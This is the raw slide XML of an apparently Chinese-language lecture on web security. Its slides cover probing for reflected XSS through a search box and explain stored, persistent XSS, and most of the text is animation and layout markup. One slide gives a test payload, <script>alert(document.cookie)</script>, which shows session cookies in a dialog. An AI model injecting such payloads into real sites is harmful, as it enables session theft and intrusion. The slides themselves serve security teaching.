                                          <p:spTgt spid="4259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25990"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(left)">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="42599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grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="425994"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(right)">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="42599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2601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26001"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromBottom)">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="426001"/>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2" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="52" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="426013"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(right)">
                                      <p:cBhvr>
                                        <p:cTn id="53" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4260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990" grpId="0" animBg="1"/>
      <p:bldP spid="425994" grpId="0" animBg="1"/>
      <p:bldP spid="425997" grpId="0" animBg="1"/>
      <p:bldP spid="426001" grpId="0" animBg="1"/>
      <p:bldP spid="4260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r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>探测示例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="427015" name="Picture 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="107950" y="981075"/>
            <a:ext cx="5111750" cy="5543550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="427023" name="Picture 15"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1425575" y="4089400"/>
            <a:ext cx="3001963" cy="1020763"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2">
                <a:alpha val="50000"/>
              </a:schemeClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427024" name="Rectangle 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5795963" y="1741488"/>
            <a:ext cx="3200400" cy="641350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>“Search” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>框内的文本信息常会反馈回用户页面</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27025" name="AutoShape 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4643438" y="1801813"/>
            <a:ext cx="1000125" cy="404812"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 61765"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3300"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2">
                <a:alpha val="50000"/>
              </a:schemeClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427026" name="Rectangle 18"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="576263" y="2708275"/>
            <a:ext cx="5724525" cy="473075"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="0000FF"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2">
                <a:alpha val="50000"/>
              </a:schemeClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427027" name="Rectangle 19"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5940425" y="4371975"/>
            <a:ext cx="2971800" cy="641350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>脚本执行并将</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息通过对话框显示出来</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27028" name="AutoShape 20"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="4714875" y="4508500"/>
            <a:ext cx="1009650" cy="406400"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 62109"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3300"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2">
                <a:alpha val="50000"/>
              </a:schemeClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427029" name="Rectangle 21"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1692275" y="1863725"/>
            <a:ext cx="1511300" cy="288925"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427030" name="Rectangle 22"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7524750" y="2708275"/>
            <a:ext cx="1008063" cy="641350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>攻击测试脚本</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427031" name="AutoShape 23"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="6442075" y="2781300"/>
            <a:ext cx="1009650" cy="406400"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 62109"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3300"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2">
                <a:alpha val="50000"/>
              </a:schemeClr>
            </a:outerShdw>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7015"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427015"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4270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27029"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427029"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427029"/>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427025"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427025"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="20" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="21" presetID="12" presetClass="entr" presetSubtype="8" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="427024"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427024"/>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2" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="427030"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromRight)">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427030"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="29" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="30" presetID="12" presetClass="entr" presetSubtype="2" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="427031"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromRight)">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427031"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="33" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="34" presetID="12" presetClass="entr" presetSubtype="2" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="35" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="427026"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromRight)">
                                      <p:cBhvr>
                                        <p:cTn id="36" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427026"/>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2" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="40" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="427027"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromRight)">
                                      <p:cBhvr>
                                        <p:cTn id="41" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427027"/>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2" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="45" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="427028"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromRight)">
                                      <p:cBhvr>
                                        <p:cTn id="46" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="427028"/>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27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24" grpId="0"/>
      <p:bldP spid="427025" grpId="0" animBg="1"/>
      <p:bldP spid="427026" grpId="0" animBg="1"/>
      <p:bldP spid="427027" grpId="0"/>
      <p:bldP spid="427028" grpId="0" animBg="1"/>
      <p:bldP spid="427029" grpId="0" animBg="1"/>
      <p:bldP spid="427030" grpId="0"/>
      <p:bldP spid="42703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7363" y="1344613"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>储存式跨站脚本攻击，也称为持久性跨站脚本攻击。如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>程序允许存储用户数据，并且存储的输入数据没有经过正确的过滤，就有可能发生这类攻击。在这种攻击模式下，攻击者并不需要利用一个恶意链接，只要用户访问了储存式跨站脚本网页，那么恶意数据就将显示为网站的一部分并以受害者身份执行。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>储存式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</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储存式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="说明: test"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1730057" y="1704975"/>
            <a:ext cx="5264785" cy="3657600"/>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储存式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4" descr="说明: xssed"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
